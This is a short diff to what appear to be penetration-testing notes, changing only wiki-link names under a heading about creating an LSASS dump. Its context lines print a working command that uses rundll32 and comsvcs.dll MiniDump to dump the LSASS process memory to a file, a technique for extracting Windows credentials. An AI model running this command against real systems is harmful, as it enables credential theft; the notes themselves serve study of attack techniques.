@@ -83,7 +83,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 ```
 
 #### Create LSASS.dmp 
-[[Password Attacks]] [[Attack LSASS]]
+[[Password-Attacks]] [[Attack-LSASS]]
 ```powershell
 PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
 ```
